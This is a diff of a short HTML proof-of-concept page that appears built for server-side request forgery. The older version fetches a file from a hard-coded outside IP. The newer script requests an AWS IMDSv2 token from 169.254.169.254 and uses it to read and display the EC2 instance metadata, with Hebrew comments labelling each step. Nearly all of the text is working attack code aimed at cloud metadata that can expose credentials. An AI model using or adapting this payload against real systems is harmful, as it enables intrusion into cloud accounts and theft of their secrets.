@@ -1,29 +1,40 @@
 <!DOCTYPE html>
 <html>
-  <head><meta charset="UTF-8"><title>PoC</title></head>
+  <head><meta charset="UTF-8"><title>IMDSv2 Attempt</title></head>
   <body>
-    <h1>Collecting Internal Info</h1>
-    <div id="output">Loading...</div>
-
+    <h1>Attempting to access EC2 metadata (v2)</h1>
+    <pre id="out">Fetching...</pre>
     <script>
-      const paths = [
-        "http://44.203.154.8/releasenotes.txt"
-      ];
+      async function getMetadata() {
+        const output = document.getElementById("out");
 
-      const out = document.getElementById('output');
+        try {
+          // שלב 1 - בקשת טוקן
+          const tokenRes = await fetch("http://169.254.169.254/latest/api/token", {
+            method: "PUT",
+            headers: {
+              "X-aws-ec2-metadata-token-ttl-seconds": "21600"
+            }
+          });
 
-      (async () => {
-        for (const url of paths) {
-          try {
-            const res = await fetch(url);
-            const text = await res.text();
-            const safe = text.replace(/</g, "&lt;").slice(0, 500);
-            out.innerHTML += `<h3>${url}</h3><pre>${safe}</pre>`;
-          } catch (e) {
-            out.innerHTML += `<h3>${url}</h3><pre>ERROR: ${e.message}</pre>`;
-          }
+          const token = await tokenRes.text();
+
+          // שלב 2 - שימוש בטוקן כדי להביא מטא-דאטה
+          const metaRes = await fetch("http://169.254.169.254/latest/meta-data/", {
+            method: "GET",
+            headers: {
+              "X-aws-ec2-metadata-token": token
+            }
+          });
+
+          const text = await metaRes.text();
+          output.textContent = "Metadata:\n\n" + text;
+        } catch (e) {
+          output.textContent = "Error:\n" + e.message;
         }
-      })();
+      }
+
+      getMetadata();
     </script>
   </body>
 </html>
